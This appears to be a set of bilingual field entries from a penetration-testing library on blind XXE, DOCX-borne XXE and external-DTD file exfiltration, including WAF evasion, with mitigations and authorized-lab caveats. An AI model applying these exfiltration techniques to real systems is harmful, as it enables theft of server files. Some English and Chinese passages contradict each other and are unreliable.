overview.zh: 覆盖无回显 XXE 的关联验证：通用实体请求收集端确认出站可达、参数实体加载远端 DTD、再把文件内容经参数实体外带到收集端。适用于响应不回显实体内容、需以带外信号确认实体注入的场景。
overview.en: Covers correlated verification of blind (no-echo) XXE: a general entity requesting a collector to confirm outbound reachability, a parameter entity loading a remote DTD, then exfiltrating file contents via parameter entities to the collector. Suitable when responses never echo entity content and injection must be confirmed via out-of-band signals.

vulnerability.zh: 根因是解析器允许 DTD 与参数实体而应用不回显解析结果，攻击者以自有收集端作为带外 oracle；参数实体可在解析器加载的外部 DTD 中组合 file/eval/exfil 链，把本地文件内容编码进外带请求（该组合只能位于外部 DTD）。
vulnerability.en: The root cause is a parser allowing DTDs and parameter entities while the application never echoes parse results, letting attackers use their own collector as an out-of-band oracle; parameter entities combine file/eval/exfil chains inside the DOCTYPE to encode local file contents into exfiltration requests.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以通用实体请求 {LAB_OAST} 收集端，收到请求即确认解析器出站可达；第 2 步以参数实体加载远端 DTD，收到 DTD 请求即确认外部加载可用；第 3 步把 file/eval/exfil 参数实体组合放入 {LAB_OAST} 托管的外部 DTD，由文档内的参数实体引用触发外带，收集端收到含文件内容的请求即确认完整外带链路。被 WAF 拦截时改用 UTF-16LE 编码转换变体。
exploitation.en: Use in Payload list order: step 1 has a general entity request the {LAB_OAST} collector; receiving the request confirms the parser can reach out. Step 2 loads a remote DTD via a parameter entity; receiving the DTD request confirms external loading works. Step 3 combines file/eval/exfil parameter entities inside the DOCTYPE to exfiltrate the target file; the collector receiving the file contents confirms the complete exfiltration chain. When blocked by a WAF, switch to the UTF-16LE encoding-conversion variant.

mitigation.en: Disable DTDs and parameter entities (Java disallow-doctype-decl, PHP libxml entity loading off) and restrict parser-process outbound networking; after the fix, replaying exfiltration payloads must produce no collector requests and DOCTYPE submissions must be rejected outright.

title.en: Point an external entity at the collector

description.zh: 实体 SYSTEM 指向探测域名路径，解析器发起请求即证明出站可达，DNS 与 HTTP 任一命中均确认 XXE 漏洞存在。
description.en: Set the SYSTEM identifier to a probe domain; any DNS or HTTP hit proves outbound fetch and thus XXE presence.

title.zh: 参数实体加载远程 DTD

description.zh: 改用参数实体在声明内部触发远程加载，实体内容不进入文档主体，适合无回显的场景建立稳定的外带利用通道。
description.en: Switch to parameter entities inside the DOCTYPE to trigger remote loads whose content never joins the body, ideal for blind setups.

title.zh: 参数实体 OOB 外带文件

description.zh: 远程 DTD 内声明文件实体并把内容拼进回连地址，目标文件内容随请求路径带出，控制端日志直接留下数据记录。
description.en: Inside the remote DTD declare a file entity and splice its contents into a callback URL so file data rides out in the request path.

description.zh: 请求被识别拦截时把 XML 转为 UTF-16LE 再提交，规则多按 UTF-8 特征编写，编码切换后仍能触发实体解析外带。
description.en: If requests are flagged, transcode the XML to UTF-16LE; rules keyed to UTF-8 signatures miss the re-encoded entity resolution.

prerequisites.zh: 确认 无回显 XXE 关联验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Blind XXE Correlation Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: 无回显 XXE 关联验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Blind XXE Correlation Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 无回显外带会产生外部连接——OAST 端点只在外带窗口开启；参数实体外带内容在报告中脱敏。
opsecTips.en: Blind exfiltration creates outbound connections — keep the OAST endpoint up only during the window, and redact exfiltrated content in the report.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

name.zh: DOCX OOXML 解析器 XXE 验证

description.zh: 覆盖 DOCX 文件解析器的 XXE 验证：从 OOXML 部件清单展开定位 document.xml，到其中嵌入外部实体样例，并附外部参数实体变体，用于确认 Word 文档解析入口的实体注入风险。
description.en: Covers XXE validation for DOCX file parsers: from OOXML part-manifest expansion locating document.xml to external-entity samples embedded within it, with external parameter-entity variants, confirming entity-injection risk at Word document parsing entry points.

overview.zh: 覆盖 DOCX 文档解析入口的 XXE 验证：解包 document.docx 定位 word/document.xml 与关系部件，在其中嵌入外部实体并经 OAST 关联解析日志。适用于服务端预览、转换或索引 Word 文档的场景。
overview.en: Covers XXE verification at the DOCX document parsing entry: unpacking document.docx to locate word/document.xml and relationship parts, then embedding external entities with OAST-correlated parse logs. Suitable when the server previews, converts, or indexes Word documents.

vulnerability.zh: 根因是服务端 Office 文档处理链允许 DTD 与外部实体，word/document.xml 在预览、转换、索引或查毒时被重新解析；上传网关先接受文件、异步服务后触发解析，风险易被漏检。
vulnerability.en: The root cause is the server-side Office document chain allowing DTDs and external entities, re-parsing word/document.xml during preview, conversion, indexing, or antivirus scanning; the upload gateway accepts the file first and async services trigger parsing later, so the risk is easily missed.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步解包 DOCX 列出 document.xml、关系部件与 Content_Types，定位解析入口；第 2 步构造保留 WordprocessingML 命名空间的 document.xml 并嵌入指向自有 OAST 的实体，在无业务数据的授权导入夹具上传并触发预览/转换，{LAB_OAST} 收到请求即确认实体加载成立。被 WAF 拦截时改用外部参数实体变体。
exploitation.en: Use in Payload list order: step 1 unpacks the DOCX listing document.xml, relationship parts, and Content_Types to locate the parsing entry; step 2 builds a document.xml preserving WordprocessingML namespaces with an embedded entity pointing at your own OAST, uploads it to an authorized import fixture free of business data, and triggers preview/conversion; {LAB_OAST} receiving the request confirms entity loading. When blocked by a WAF, switch to the external parameter-entity variant.

mitigation.en: Disable DOCTYPE and external entities in Office parsers, run conversion services network-free with low privileges, and validate part inventory; after the fix, uploaded entity samples must produce no exfiltration requests, with abnormal entity errors on document jobs monitored.

description.zh: 解压目标文档检查正文、关系与内容类型等部件，确定解析器加载文档时必经的 XML 注入位置，锁定最佳落点。
description.en: Unzip the docx and inspect document.xml, rels and content types to find the XML part always parsed with the body.

title.zh: document 注入实体指向探测端
title.en: Inject an entity into document.xml aimed at the probe

description.zh: 在正文部件声明内加入指向探测地址的实体，重打包为文档后被打开或服务端解析时，即触发回连命中信号确认漏洞。
description.en: Declare a probe-pointing entity in the document.xml DOCTYPE; repacking the file and opening it triggers the callback hit.

title.en: Deliver the document to trigger parsing

description.zh: 把注毒文档通过协同分享、在线预览等路径送达目标环境，解析器加载文档即执行实体，控制端收到回连确认命中。
description.en: Route the poisoned document through sharing or online preview; the parser load executes the entity and the collector receives the hit.

description.en: Swap in parameter entities pulling a remote DTD to move past internal-entity limits and stage file read and exfil blocks.

title.zh: DOCX 外部参数实体变体

description.zh: DOCX 外部参数实体变体 — 在 document.xml 内以外部参数实体加载远端 DTD 作为可定位变体；阳性必须同时具备 OAST 请求与服务端 OOXML 解析日志。
description.en: Replace the vague relationship-part note with a locatable external parameter-entity variant in document.xml. A positive result requires both OAST and server-side OOXML parser logs.

explanation.en: Expand and load the external DTD

description.zh: 解包 document.docx 并列出 document.xml、关系部件与 Content_Types，定位可注入实体的 XML 解析入口。
description.en: Unpacks document.docx and lists document.xml, relationship parts, and Content_Types to locate the XML parsing entry points for entity injection.

explanation.zh: DOCX是ZIP压缩包，解压获取内部XML
explanation.en: Describes how the command segment "unzip document.docx" participates in this validation command.

name.zh: 外部 DTD 参数实体外带利用

description.zh: 覆盖外部 DTD 引用与参数实体高级用法验证：从参数实体 OOB 外带块与外部 DTD 引用，到 CDATA 包裹读取文件内容，再到报错式参数实体外带，用于确认 DTD 加载边界的绕过形态。
description.en: Covers external DTD references and advanced parameter-entity usage: from parameter-entity OOB exfiltration blocks and external DTD references through CDATA-wrapped file-content reads to error-based parameter-entity exfiltration, confirming bypass forms of the DTD loading boundary.

overview.zh: 覆盖外部 DTD 引用与参数实体的高级用法验证：参数实体 OOB 外带块、外部 DTD 引用、CDATA 包裹读取与报错式外带四种样例块。用于确认 DTD 加载开启后的绕过形态与可用外带通道。
overview.en: Covers advanced usage verification of external DTD references and parameter entities across four sample blocks: a parameter-entity OOB exfiltration block, an external DTD reference, CDATA-wrapped reads, and error-based exfiltration. Used to confirm bypass forms and usable exfiltration channels once DTD loading is on.

vulnerability.zh: 根因是解析器允许加载外部 DTD 子集，参数实体在外部 DTD 中可自由组合 file/eval/exfil 链；CDATA 包裹规避内容解析、报错式外带把内容并入错误信息，均绕过内部子集限制。
vulnerability.en: The root cause is the parser loading external DTD subsets where parameter entities freely compose file/eval/exfil chains; CDATA wrapping avoids content parsing and error-based exfiltration merges contents into error messages, both bypassing internal-subset restrictions.

exploitation.zh: 按 Payload 列表顺序使用：先以第 2 步引用外部 DTD，{LAB_OAST} 收到 DTD 请求即确认外部加载开启；再用第 1 步把参数实体外带块放入外部 DTD，收集端收到含文件内容的请求即确认外带成立；第 3 步用 %start;%file;%end; 把文件包进 CDATA 规避内容解析；第 4 步把文件内容塞进不存在路径借解析器报错带回内容。WAF 夹具区提供 HTTPS 拉取外部 DTD 的受控形态。
exploitation.en: Use in Payload list order: first reference an external DTD per step 2; {LAB_OAST} receiving the DTD request confirms external loading is on. Then place the parameter-entity exfiltration block into the external DTD per step 1; the collector receiving file contents confirms exfiltration. Step 3 wraps the file with %start;%file;%end; inside CDATA to avoid content parsing; step 4 stuffs file contents into a nonexistent path so parser errors carry them back. The WAF fixture section provides a controlled HTTPS external-DTD form.

mitigation.en: Disable external DTD subsets and parameter entities in the parser and restrict outbound networking to owned domains; after the fix, replaying each block must raise entity-forbidden or DTD-rejected errors with no listener requests.

title.en: Exfiltrate files with a parameter-entity block

description.zh: 远端 DTD 内先声明文件实体，再用嵌套实体把内容拼进回连地址，两级参数实体链式触发完成文件内容外带。
description.en: In the remote DTD declare a file entity, then splice contents into a callback URL through nested %eval/%exfil chaining.

title.en: Reference the external DTD from the document

description.zh: 提交的 XML 在内部声明处以参数实体拉取控制端 DTD，远端内容随即成为解析上下文一部分，为利用块铺路。
description.en: The submitted XML pulls the collector DTD through a DOCTYPE parameter entity, making remote content part of the parse context.

description.zh: 用起始、结束与聚合三个参数实体把文件内容包进 CDATA 区段，多行内容不再破坏结构，整段顺利完成外带。
description.en: Three parameter entities wrap file contents in a CDATA section so multi-line data survives the XML structure and exfiltrates whole.

description.zh: 回连被阻断时把文件内容拼进不存在的文件路径，解析报错消息携带数据返回页面，借报错通道完成数据外带回收。
description.en: When callbacks are blocked, splice contents into a nonexistent path; the parser error message carries the data back to the page.

title.zh: 本地拉取 DTD 控制内容

description.en: Curl the crafted DTD locally to check syntax and encoding before hosting it, ensuring the step 1 chain fires reliably.
